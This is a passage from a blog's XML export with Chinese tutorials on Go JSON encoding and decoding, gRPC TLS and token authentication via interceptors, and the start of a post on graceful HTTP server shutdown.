客户端用到的手段，只能是HTTP协议。具体来说，就是HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。 参考文档 RESTful tutorial REST vs SOAP 阮一峰博客 Fielding论文对RESTful具体描述]]></content>
      <categories>
        <category>程序设计</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go语言JSON详解]]></title>
    <url>%2F2017%2F10%2F03%2Fgolang-json%2F</url>
    <content type="text"><![CDATA[目前我们看到很多的开放平台，基本上都是采用了JSON作为他们的数据交互的格式。既然JSON在Web开发中如此重要，那么Go语言对JSON支持的怎么样呢？Go语言的标准库已经非常好的支持了JSON，可以很容易的对JSON数据进行编、解码的工作。如果有更灵活的需求也有不错的第三方库提供支持。这篇文章将全面解读Golang中JSON的使用。 JSON简介JSON（Javascript Object Notation）是一种轻量级的数据交换语言，以文字为基础，具有自我描述性且易于让人阅读。尽管JSON是Javascript Standard ECMA-262 3rd Edition – December 1999的一个子集，但JSON是独立于语言的文本格式，并且采用了类似于C语言家族的一些习惯, 这些特性使JSON成为理想的数据交换语言。 JSON与XML最大的不同在于XML是一个完整的标记语言，而JSON不是。JSON由于比XML更小、更快，更易解析,以及浏览器的内建快速解析支持,使得其更适用于网络数据传输领域。 在讲解JSON的数据结构之前, 我们先来一段简单的样例JSON数据:12345678910111213141516171819202122[ &#123; "precision": "zip", "Latitude": 37.7668, "Longitude": -122.3959, "Address": "", "City": "SAN FRANCISCO", "State": "CA", "Zip": "94107", "Country": "US" &#125;, &#123; "precision": "zip", "Latitude": 37.371991, "Longitude": -122.026020, "Address": "", "City": "SUNNYVALE", "State": "CA", "Zip": "94085", "Country": "US" &#125;] JSON建构于两种结构: 键值对的集合(A collection of name/value pairs): 在不同的语言中, 他们被理解为: object(Javascript), struct(Golang), Dictinary(Python), 以及哈希表(hash table), 有键列表(keyed list), 或者关联数组(associative array). 值的有序列表(An ordered list of values): 在大部分语言中，它被理解为数组(array). 其中值可以包含如下类型, 并且这些结构可以嵌套: 字符串(string): 由双引号包围的任意数量Unicode字符的集合，使用反斜线转义, 一个字符(character)即一个单独的字符串(character string) 数值(number): 同时包含整数和浮点数 布尔值(booleans): 布尔值包含: true和false 空(null): 空 对象(object): 键值对的集合 数组(array): 值的有序列表 这些都是常见的数据结构。事实上大部分现代计算机语言都以某种形式支持它们。这使得一种数据格式在同样基于这些结构的编程语言之间交换成为可能。 JSON与Go数据结构映射JSON格式可以算我们日常最常用的序列化格式之一了, Go语言作为一个由Google开发, 号称互联网的C语言的语言, 自然也对JSON格式支持很好。Golang的标准库encoding/json实现的JSON标准(RFC 4627)的编码和解码, 可以让我们很方便地进行JSON数据的转换. 具体详情可以参考标准库Marshal和Unmarshal函数的注释, 下面是一个基本的数据关系映射总结: Golang Type JSON Type Description bool booleans true or false int, float numbers 对于golang所有的数值类型 string strings 字符串会转换成UTF-8进行输出，无法转换的会打印对应的unicode值。而且为了防止浏览器把json输出当做html， “&lt;”、”&gt;” 以及 “&amp;” 会被转义为 “\u003c”、”\u003e” 和 “\u0026” array,slice arrays Publish Acknowledgment struct objects 只有导出的字段(以大写字母开头)才会在输出中 nil null 空 Go语言是个强类型语言，对格式要求极其严格而JSON格式虽然也有类型，但是并不稳定，Go语言在解析来源为非强类型语言时比如PHP,Python等序列化的JSON时，经常遇到一些问题诸如字段类型变化导致无法正常解析的情况，导致服务不稳定。所以在做JSON相关解码和编码的过程中, 需要注意以下事项: Go语言中一些特殊的类型，比如Channel、complex、function是不能被解析成JSON的. JSON对象只支持string作为key，所以要编码一个map，那么必须是map[string]T这种类型(T是Go语言中任意的类型) 嵌套的数据是不能编码的，不然会让JSON编码进入死循环 指针在编码的时候会输出指针指向的内容，而空指针会输出null 标准库解读在使用标准库进行json操作之前, 先简单了解下标准库提供了那些对JSON的操作, 以下解读主要来源于GoDoc 函数 Compact: 用于JSON字符串的拼接, 拼接时会校验后面的字符串是否是合法json, 如果不是会报错, 但对字符串中的特殊字符(html不安全字符,比如上面提到的”&lt;” “&gt;”等)不进行转义. HTMLEscape: 和Compact相对, 拼接JSON字符串时会进行特殊字符转义, 转义成web安全的字符. Valid: 校验数据是否是合法的JSON编码数据, 往往用于数据格式校验. Marshal: 用于编码JSON. Indent: 用于JSON的格式化输出, 最常见的用法是定义JSON的缩进,比如2个空格的缩进. MarshalIndent: 编码JSON后,带格式化的输出. Unmarshal: 用于解码JSON. 接口 Unmarshaler: 用于自定义解码json方法 Marshaler: 用于自定义编码json的方法 结构体 Decoder: 从一个输入流读取数据并且解析json Encoder: 把一个编码后的json值写出给一个输出流 Number: JSON里面的number类型 RawMessage: 是一种已经被编码的json字符串, 它实现了Marshaler和Unmarshaler, 可以用来延迟解析部分json Token: 一个空interface, 持有一种Json映射的Go内部数据结构的值 123456Delim, for the four JSON delimiters [ ] &#123; &#125;bool, for JSON booleansfloat64, for JSON numbersNumber, for JSON numbersstring, for JSON string literalsnil, for JSON null 异常 InvalidUTF8Error: 用于兼容golang1.2版本之前, 1.2过后不会有该异常 InvalidUnmarshalError: 表示解码json时传递了一个非法的参数, 比如一个空指针 MarshalerError: Marshaler异常 SyntaxError: json的语法错误 UnmarshalFieldError: 降级, 未使用, 为了兼容保留 UnmarshalTypeError: 解码时 遇到不认识的json类型, 表明传入的json的类型无法被转换成Golang对应的类型, 比如JSON RFC增加新的JSON类型 就会遇到这样的错误 UnsupportedTypeError: 编码时 遇到不认识的Golang类型, 不知道该Golang的数据类型应该被映射成那种json类型, 比如自定义的类型(未实现 marshaler接口) UnsupportedValueError: 同上, 遇到不认识的json类型, 比如 你需要将golang里面的”a”编程成json里面不存在的类型 Struct Tag在JSON的解析过程中Struct Tag被频繁使用, 因此在进行真正的解析之前, 介绍下Golang中的Struct Tag,在golang中, 命名都是推荐都是用驼峰方式, 并且在首字母大小写有特殊的语法含义(大写变量可以导出包, 小写变量包私有)。但是由于经常需要和其它的系统进行数据交互, 例如转成json格式, 存储到mongodb啊等等。这个时候如果用属性名来作为键值可能不一定会符合项目要求, 比如不是用Struct Tag时, JSON解析出来的结果是这样的: 123456789101112131415161718package mainimport ( "encoding/json" "fmt")// User is test for jsontype User struct &#123; ID string Name string&#125;func main() &#123; u := User&#123;ID: "user001", Name: "tom"&#125; jsonU, _ := json.Marshal(u) fmt.Println(string(jsonU))&#125; 输出内容如下:1&#123;"ID":"user001","Name":"tom"&#125; 显然如果这样解析JSON会太死板, 无法面对灵活的业务, 而具体如何转换应该交给我们自己控制, 而Struct Tag就是用来干这个事儿的。Struct Tag采用 跟随在Struct Field后面。12345678910111213141516171819202122232425那`Struct Tag`的工作原理是咋样的? 需要用到Tag中的内容时, 咋样去获取喃? 其实是使用反射(reflect)中的方法来获取的:```golangpackage mainimport ( &quot;fmt&quot; &quot;reflect&quot;)// User is test for jsontype User struct &#123; ID string `json:&quot;json_id&quot; bson:&quot;bson_id&quot; custom:&quot;my_id&quot;` Name string `json:&quot;json_name&quot; bson:&quot;bson_name&quot; custom:&quot;my_name&quot;`&#125;func main() &#123; u := &amp;User&#123;ID: &quot;user001&quot;, Name: &quot;tom&quot;&#125; t := reflect.TypeOf(u) // 获取第一个字段的Struct Tag的值 f0 := t.Elem().Field(0) fmt.Println(f0.Tag.Get(&quot;json&quot;)) fmt.Println(f0.Tag.Get(&quot;bson&quot;)) fmt.Println(f0.Tag.Get(&quot;custom&quot;))&#125; 输出结果如下:123json_idbson_idmy_id 解析JSON通过标准库提供的Unmarshal函数来解析JSON, 但是标准库在解析未知格式的JSON时比较麻烦, 需要解析到interface{},然后断言, 因此如果想要灵活的解析JSON可以使用一些第三方库,比如jsonitor 解析已知JSON之前介绍了Golang中的Struct Tag, 而标准库encoding/json就是利用Stuct Tag可以轻松实现JSON编解码过程中的一些自定义转换, 而关于JSON Struct Tag具体的值, 标准库文档里面有相应的描述, 这里作简单的概述: Json Struct Tag 格式为json: &quot;filed_name,argument&quot; filed_name 为用户自定义的需要转换的字段名, 如果为”-“表示 转换时直接忽略字段 argument 表示该字段转换时的一些额外的参数 omitempty 表示如果为空置则忽略字段 json数据类型, 比如string, numbers, 表示在转换时, 调整成对应的数据类型 12345678910111213141516171819202122232425package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` p := Product&#123;&#125; json.Unmarshal([]byte(str), &amp;p) fmt.Println(p)&#125; 输出结果:1&#123;test 1 110011 0.01 true &#125; 解析未知JSON上面那种解析方式是在我们知晓被解析的JSON数据的结构的前提下采取的方案, 如果我们不知道被解析的数据的格式, 又应该如何来解析呢?我们知道interface{}可以用来存储任意数据类型的对象，这种数据结构正好用于存储解析的未知结构的json数据的结果。JSON包中采用map[string]interface{}和[]interface{}结构来存储任意的JSON对象和数组。 解析到interface{}1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; // 假设我们并不知道这个JSON的格式, 我们可以将他解析到interface&#123;&#125; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` var p interface&#123;&#125; json.Unmarshal([]byte(str), &amp;p) // 现在我们需要从这个interface&#123;&#125;解析出里面的数据 m := p.(map[string]interface&#123;&#125;) for k, v := range m &#123; switch vv := v.(type) &#123; case string: fmt.Printf("%s is string, value: %s\n", k, vv) case int: fmt.Printf("%s is int, value: %d\n", k, vv) case int64: fmt.Printf("%s is int64, value: %d\n", k, vv) case bool: fmt.Printf("%s is bool, vaule: %v", k, vv) default: fmt.Printf("%s is unknow type\n", k) &#125; &#125;&#125; 输出结果:12345name is string, value: testproduct_id is string, value: 1number is string, value: 110011price is string, value: 0.01is_on_sale is string, value: true 使用第三方库jsonitor进行解析大量的类型断言是不是让你觉得很烦, 如果是多层interface{}嵌套那么断言需要更多, 因此就有很多第三方JSON解析库出现, 他们尽量采用流式迭代解析, 这里我用过的比较不错的是陶文的jsonitor:1234567891011121314151617181920212223package mainimport ( "fmt" "github.com/json-iterator/go")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` fmt.Println(jsoniter.Get([]byte(str), "price").ToFloat64())&#125; 自定义解析struct实现Unmarshaler接口, 便可以实现解析JSON的过程,1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;// UnmarshalJSON 自定义解析func (p *Product) UnmarshalJSON(data []byte) error &#123; // 示例代码使用jsonitor代为解析 p.Price = 0.01 p.Number = 1100 p.Name = "my_test_name" return nil&#125;// MarshalJSON 自定义编码func (p *Product) MarshalJSON() ([]byte, error) &#123; // 自己编码json return []byte(`&#123;"test":"name_test"&#125;`), nil&#125;func main() &#123; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` p := Product&#123;&#125; json.Unmarshal([]byte(str), &amp;p) fmt.Println(p)&#125; 生成JSON我们可以通过标准库json将Struc序列化成JSON也可以自定义序列化的方法 通过struct生成JSON上面在介绍JSON解析的时候已经介绍了关于JSON的Struct Tag了, 因此直接参考代码:12345678910111213141516171819202122232425262728293031package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; p := &amp;Product&#123; Name: "test", ProductID: 01, Number: 110011, Price: 0.01, IsOnSale: true, Test: "test", &#125; jsonP, _ := json.Marshal(p) fmt.Println(string(jsonP))&#125; 输出结果如下:1&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125; 自定义生成Struct实现Marshaler接口, 便可以自定义编码过程1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;// UnmarshalJSON 自定义解析func (p *Product) UnmarshalJSON(data []byte) error &#123; // 示例代码使用jsonitor代为解析 p.Price = 0.01 p.Number = 1100 p.Name = "my_test_name" return nil&#125;// MarshalJSON 自定义编码func (p *Product) MarshalJSON() ([]byte, error) &#123; // 自己编码json return []byte(`&#123;"test":"name_test"&#125;`), nil&#125;func main() &#123; p := &amp;Product&#123; Name: "test", ProductID: 01, Number: 110011, Price: 0.01, IsOnSale: true, Test: "test", &#125; jsonP, _ := json.Marshal(p) fmt.Println(string(jsonP))&#125; 参考 JSON官方介绍 JSON RFC4672 encoding/json godoc Go Blog: JSON and Go Golang中使用JSON的一些小技巧]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gRPC基于拦截器模式的认证]]></title>
    <url>%2F2017%2F08%2F07%2Fgrpc-auth%2F</url>
    <content type="text"><![CDATA[gRPC的服务端需要与认证平台对接, 之前使用http时通过中间件的形式进行实现, 因此这篇文章主要验证gRPC中能否以中间件的形式实现gRPC的认证。 认证方式gRPC 默认提供了两种认证方式： 基于SSL/TLS认证方式 远程调用认证方式为了保证API Gateway与后端gRPC服务通信的安全同时保证token安全, 以上2种方式同时使用。 代码示例我需要验证的流程大致如下(与Openstack的认证流程一样):完整的代理示例: grpc中间件认证 在进行coding前, 我们需要为服务端生成TLS需要的证书: 自建CA 12345678910111213141516# 生成CA自己的私钥$(umask 077; openssl genrsa -out private/cakey.pem 2048)# 自签10年$openssl req -new -x509 -key private/cakey.pem -out cacert.pemCountry Name (2 letter code) [AU]:CNState or Province Name (full name) [Some-State]:SiChuanLocality Name (eg, city) []:ChengDuOrganization Name (eg, company) [Internet Widgits Pty Ltd]:defineIOT LtdOrganizational Unit Name (eg, section) []:TecCommon Name (e.g. server FQDN or YOUR name) []:caEmail Address []:yumaojun03@gmail.com# 初始化自建CA的一部分文件$mkdir certs newcerts crl$touch index.txt$touch serial$echo 01 &gt; serial 签发服务端证书 1234567891011121314151617181920212223242526272829303132# 生成server自己的私钥$openssl genrsa -out server1.key 2048# 生成证书签证请求$openssl req -new -key server1.key -out server1.csrCountry Name (2 letter code) [AU]:CNState or Province Name (full name) [Some-State]:ChengduLocality Name (eg, city) []:ChengduOrganization Name (eg, company) [Internet Widgits Pty Ltd]:defineIOT LtdOrganizational Unit Name (eg, section) []:TecCommon Name (e.g. server FQDN or YOUR name) []:server1Email Address []:yumaojun03@gmail.comPlease enter the following 'extra' attributesto be sent with your certificate requestA challenge password []:An optional company name []:# 因为我CA就在本服务器上,直接签发证书$openssl ca -in GoWorkDir/src/golang/grpc-auth/keys/server1.csr -out server1.pem -days 3650Using configuration from /System/Library/OpenSSL/openssl.cnfCheck that the request matches the signatureSignature okThe stateOrProvinceName field needed to be the same in theCA certificate (SiChuan) and the request (Chengdu)# 将签好的证书交给server$mv server1.pem GoWorkDir/src/golang/grpc-auth/keys# server端的证书准备完成$ll GoWorkDir/src/golang/grpc-auth/keystotal 40-rw-r--r-- 1 maojun staff 1.6K 8 8 09:15 cacert.pem-rw-r--r-- 1 maojun staff 1.0K 8 8 09:27 server1.csr-rw-r--r-- 1 maojun staff 1.6K 8 7 21:21 server1.key-rw-r--r-- 1 maojun staff 4.5K 8 8 09:28 server1.pem 目录结构生成契约文件1$protoc --go_out=plugins=grpc:. hello.proto 目录结构如下:1234567891011121314$tree ..├── client│ └── main.go├── keys│ ├── cacert.pem│ ├── server1.csr│ ├── server1.key│ └── server1.pem├── proto│ ├── hello.pb.go│ └── hello.proto└── server └── main.go tls先看credentials.go中关于通过TLS创建客户端和服务端相关函数12345678910111213141516171819202122// NewClientTLSFromFile 传入客户端建立TLS连接时需要的证书, 这里主要指CA的证书// serverNameOverride 仅仅由于测试, 通常传入""func NewClientTLSFromFile(certFile, serverNameOverride string) (TransportCredentials, error) &#123; b, err := ioutil.ReadFile(certFile) if err != nil &#123; return nil, err &#125; cp := x509.NewCertPool() if !cp.AppendCertsFromPEM(b) &#123; return nil, fmt.Errorf("credentials: failed to append certificates") &#125; return NewTLS(&amp;tls.Config&#123;ServerName: serverNameOverride, RootCAs: cp&#125;), nil&#125;// NewServerTLSFromFile 传入服务端建立TLS连接时需要的证书, 这里主要指服务端的证书和私钥func NewServerTLSFromFile(certFile, keyFile string) (TransportCredentials, error) &#123; cert, err := tls.LoadX509KeyPair(certFile, keyFile) if err != nil &#123; return nil, err &#125; return NewTLS(&amp;tls.Config&#123;Certificates: []tls.Certificate&#123;cert&#125;&#125;), nil&#125; 因此我们自建一个CA, 然后生成server端的证书就可以使用这组函数来完成TLS的建立了 服务端TLS启动1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport ( "net" pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/credentials" // 引入grpc认证包 "google.golang.org/grpc/grpclog")const ( // Address gRPC服务地址 Address = "127.0.0.1:50052")// 定义helloService并实现约定的接口type helloService struct&#123;&#125;// HelloService ...var HelloService = helloService&#123;&#125;func (h helloService) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloResponse, error) &#123; resp := new(pb.HelloResponse) resp.Message = "Hello " + in.Name + "." return resp, nil&#125;func main() &#123; listen, err := net.Listen("tcp", Address) if err != nil &#123; grpclog.Fatalf("failed to listen: %v", err) &#125; // TLS认证 creds, err := credentials.NewServerTLSFromFile("../keys/server1.pem", "../keys/server1.key") if err != nil &#123; grpclog.Fatalf("Failed to generate credentials %v", err) &#125; // 实例化grpc Server, 并开启TLS认证 s := grpc.NewServer(grpc.Creds(creds)) // 注册HelloService pb.RegisterHelloServer(s, HelloService) grpclog.Println("Listen on " + Address + " with TLS") s.Serve(listen)&#125; 客户端带证书调用1234567891011121314151617181920212223242526272829303132333435363738394041424344package mainimport ( pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/credentials" // 引入grpc认证包 "google.golang.org/grpc/grpclog")const ( // Address gRPC服务地址 Address = "127.0.0.1:50052")func main() &#123; // TLS连接 creds, err := credentials.NewClientTLSFromFile("../keys/cacert.pem", "server1") if err != nil &#123; grpclog.Fatalf("Failed to create TLS credentials %v", err) &#125; conn, err := grpc.Dial(Address, grpc.WithTransportCredentials(creds)) if err != nil &#123; grpclog.Fatalln(err) &#125; defer conn.Close() // 初始化客户端 c := pb.NewHelloClient(conn) // 调用方法 reqBody := new(pb.HelloRequest) reqBody.Name = "gRPC" r, err := c.SayHello(context.Background(), reqBody) if err != nil &#123; grpclog.Fatalln(err) &#125; grpclog.Println(r.Message)&#125; 认证拦截器认证包含2部分: 服务端认证token 客户端携带token 服务端认证token拦截器部分的源码在interceptor.go中, 我仅关注普通rpc, 对于流式rpc的拦截器不做说明, 以下是相关函数: 客户端拦截器 服务端拦截器12345678// UnaryClientInterceptor拦截在客户端执行的非流式RPC. inovker就是真正的RPC的handler,// 拦截器的责任就是完成自己的逻辑后调用该handler, 让请求继续RPC的工作 type UnaryClientInterceptor func(ctx context.Context, method string, req, reply interface&#123;&#125;, cc *ClientConn, invoker UnaryInvoker, opts ...CallOption) error// UnaryServerInterceptor 提供了一个在服务器上执行unary RPC的钩子, // info 包含拦截器可以操作的RPC的所有信息。// handler 是服务方法实现的一个包装器, 而拦截器的责任就是调用该handler完成RPC, 让请求继续RPC的工作type UnaryServerInterceptor func(ctx context.Context, req interface&#123;&#125;, info *UnaryServerInfo, handler UnaryHandler) (resp interface&#123;&#125;, err error) 因此我们想要在服务端实现请求的认证功能, 仅需要实现一个自己的UnaryServerInterceptor函数, 并且在server启动时作为参数传递给它即可 总体需要3步: 自定义auth函数,实现认证逻辑 定义一个使用自定义认证(auth)的拦截器 server启动时随参数传入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100package mainimport ( "net" pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/codes" // grpc 响应状态码 "google.golang.org/grpc/credentials" // grpc认证包 "google.golang.org/grpc/grpclog" "google.golang.org/grpc/metadata" // grpc metadata包)const ( // Address gRPC服务地址 Address = "127.0.0.1:50052")// 定义helloService并实现约定的接口type helloService struct&#123;&#125;// HelloService ...var HelloService = helloService&#123;&#125;func (h helloService) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloResponse, error) &#123; resp := new(pb.HelloResponse) resp.Message = "Hello " + in.Name + "." return resp, nil&#125;// auth 验证Tokenfunc auth(ctx context.Context) error &#123; md, ok := metadata.FromContext(ctx) if !ok &#123; return grpc.Errorf(codes.Unauthenticated, "无Token认证信息") &#125; var ( appid string appkey string ) if val, ok := md["appid"]; ok &#123; appid = val[0] &#125; if val, ok := md["appkey"]; ok &#123; appkey = val[0] &#125; grpclog.Printf("appid: %s, appkey: %s\n", appid, appkey) if appid != "101010" || appkey != "i am key" &#123; return grpc.Errorf(codes.Unauthenticated, "Token认证信息无效: appid=%s, appkey=%s", appid, appkey) &#125; return nil&#125;func main() &#123; listen, err := net.Listen("tcp", Address) if err != nil &#123; grpclog.Fatalf("Failed to listen: %v", err) &#125; var opts []grpc.ServerOption // TLS认证 creds, err := credentials.NewServerTLSFromFile("../keys/server1.pem", "../keys/server1.key") if err != nil &#123; grpclog.Fatalf("Failed to generate credentials %v", err) &#125; opts = append(opts, grpc.Creds(creds)) // 注册interceptor var interceptor grpc.UnaryServerInterceptor interceptor = func(ctx context.Context, req interface&#123;&#125;, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (resp interface&#123;&#125;, err error) &#123; err = auth(ctx) if err != nil &#123; return &#125; // 继续处理请求 return handler(ctx, req) &#125; opts = append(opts, grpc.UnaryInterceptor(interceptor)) // 实例化grpc Server s := grpc.NewServer(opts...) // 注册HelloService pb.RegisterHelloServer(s, HelloService) grpclog.Println("Listen on " + Address + " with TLS + Token + Interceptor") s.Serve(listen)&#125; 客户端携带token而至于客户端如何在每次调用时都传递自己的token信息, 有比客户端拦截器更方便的方式, 因为credentials中有提供这样的接口这部分代码在credentials.go中1234567891011// PerRPCCredentials 为认证定义了一个通用接口, 每次RPC调用都需要提供安全信息(比如oauth2的token)type PerRPCCredentials interface &#123; // GetRequestMetadata 获取当前请求的元数据, 如果需要可以刷新tokens. // 该方法在请求被传输之前调用, 而数据需要放在header里面或者其他context中. // uri代表请求条目的URI // 在底层实现的支持下, ctx可以用于超时和取消 // TODO: 定义限定键的集合，而不是将其保留为任意字符串。 GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) // RequireTransportSecurity 表明认证过程是否需要安全传输(是否开启TLS) RequireTransportSecurity() bool&#125; 因此可以看出我们仅需要实现GetRequestMetadata和RequireTransportSecurity即可, 通过GetRequestMetadata方法将需要的token传递给客户端即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport ( pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/credentials" // 引入grpc认证包 "google.golang.org/grpc/grpclog")const ( // Address gRPC服务地址 Address = "127.0.0.1:50052" // OpenTLS 是否开启TLS认证 OpenTLS = true)// customCredential 自定义认证type customCredential struct&#123;&#125;func (c customCredential) GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) &#123; return map[string]string&#123; "appid": "101010", "appkey": "i am key", &#125;, nil&#125;func (c customCredential) RequireTransportSecurity() bool &#123; if OpenTLS &#123; return true &#125; return false&#125;func main() &#123; var err error var opts []grpc.DialOption if OpenTLS &#123; // TLS连接 creds, err := credentials.NewClientTLSFromFile("../keys/cacert.pem", "server1") if err != nil &#123; grpclog.Fatalf("Failed to create TLS credentials %v", err) &#125; opts = append(opts, grpc.WithTransportCredentials(creds)) &#125; else &#123; opts = append(opts, grpc.WithInsecure()) &#125; // 指定自定义认证 opts = append(opts, grpc.WithPerRPCCredentials(new(customCredential))) conn, err := grpc.Dial(Address, opts...) if err != nil &#123; grpclog.Fatalln(err) &#125; defer conn.Close() // 初始化客户端 c := pb.NewHelloClient(conn) // 调用方法 reqBody := new(pb.HelloRequest) reqBody.Name = "gRPC" r, err := c.SayHello(context.Background(), reqBody) if err != nil &#123; grpclog.Fatalln(err) &#125; grpclog.Println(r.Message)&#125; 测试针对以上功能做测试 正常测试带证书和合法token的请求123$go run main.go2017/08/08 10:36:10 Listen on 127.0.0.1:50052 with TLS + Token + Interceptor2017/08/08 10:36:13 appid: 101010, appkey: i am key 请求成功12$go run main.go2017/08/08 10:36:13 Hello gRPC. 异常测试不带证书的请求123$go run main.go2017/08/08 11:05:36 Listen on 127.0.0.1:50052 with TLS + Token + Interceptor2017/08/08 11:05:38 grpc: Server.Serve failed to complete security handshake from "127.0.0.1:56310": tls: first record does not look like a TLS handshake 请求失败1234$go run main.go2017/08/08 11:05:38 transport: http2Client.notifyError got notified that the client transport was broken unexpected EOF.2017/08/08 11:05:38 rpc error: code = Internal desc = transport is closingexit status 1 带证书但token不合法123$go run main.go2017/08/08 11:08:36 rpc error: code = Unauthenticated desc = Token认证信息无效: appid=101010, appkey=i am key1exit status 1]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>gRPC</tag>
        <tag>APIGateway</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang HTTP服务优雅重启]]></title>
    <url>%2F2017%2F08%2F06%2Fhttp-graceful%2F</url>
    <content type="text"><![CDATA[RESTful API Gateway是一个高稳定性的组件, 因此需要有像Nginx Reload那样平滑升级的能力, 即关闭正在运行的老程序，并启动新程序。 标准库的的实现Go在1.8对net/http进行了更新, 提供了http服务优雅关闭的能力。 官方说明我们看下server.go中关于Colse方法的描述:1234567891011121314// Close将会立即关闭所有活跃的监听器以及所有连接,比如新连接,活跃连接, 空闲连接// 如果想优雅关闭服务, 请使用Shutdown// 注意close并不尝试关闭或者等待hijacked连接，如WebSocketsfunc (srv *Server) Close() error &#123; srv.mu.Lock() defer srv.mu.Unlock() srv.closeDoneChanLocked() err := srv.closeListenersLocked() for c := range srv.activeConn &#123; c.rwc.Close() delete(srv.activeConn, c) &#125; return err&#125; 对比close方法, 我们看下Shutdown到底多做了什么工作:12345678910111213141516171819202122232425262728293031323334353637// Shutdown会启动一个定时器,定期巡检那些空闲连接, 然后把这些空闲连接关闭// 而这个巡检时间就是shutdownPollInterval, 可以看出默认为500毫秒// // 我们能找到不涉及投票的最理想解决方案，同时它的消耗也很少(不涉及任何互斥锁),// 但是是留给读者作为练习。var shutdownPollInterval = 500 * time.Millisecond// Shutdown 将无中断的关闭正在活跃的连接，然后平滑的停止服务。处理流程如下:// 1) 首先关闭所有的监听// 2) 然后关闭所有的空闲连接// 3) 然后无限期等待连接处理完毕转为空闲，并关闭// 4) 如果提供了 带有超时的Context，将在服务关闭前返回 Context的超时错误// // Shutdown 并不尝试关闭或者等待 hijacked连接，// 如 WebSockets。如果需要的话调用者需要分别处理诸如长连接类型的等待和关闭。func (srv *Server) Shutdown(ctx context.Context) error &#123; atomic.AddInt32(&amp;srv.inShutdown, 1) defer atomic.AddInt32(&amp;srv.inShutdown, -1) srv.mu.Lock() lnerr := srv.closeListenersLocked() srv.closeDoneChanLocked() srv.mu.Unlock() ticker := time.NewTicker(shutdownPollInterval) defer ticker.Stop() for &#123; if srv.closeIdleConns() &#123; return lnerr &#125; select &#123; case &lt;-ctx.Done(): return ctx.Err() case &lt;-ticker.C: &#125; &#125;&#125; 简单样例根据上面的分析, 我们写一个简单的栗子进行测试(Github地址: HTTP Graceful)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( "context" "fmt" "log" "net/http" "os" "os/signal" "syscall" "time")func main() &#123; http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) &#123; // for test active connection time.Sleep(time.Second * 2) fmt.Fprintf(w, "Hello World, %v\n", time.Now()) &#125;) s := &amp;http.Server&#123; Addr: ":8080", Handler: http.DefaultServeMux, ReadTimeout: 10 * time.Second, WriteTimeout: 10 * time.Second, MaxHeaderBytes: 1 &lt;&lt; 20, &#125; go func() &#123; log.Printf("server start at: 127.0.0.1:8080") log.Println(s.ListenAndServe()) log.Println("server shutdown") &#125;() // Handle SIGINT, SIGTERM, SIGKILL, SIGHUP, SIGQUIT ch := make(chan os.Signal) signal.Notify(ch, syscall.SIGTERM, 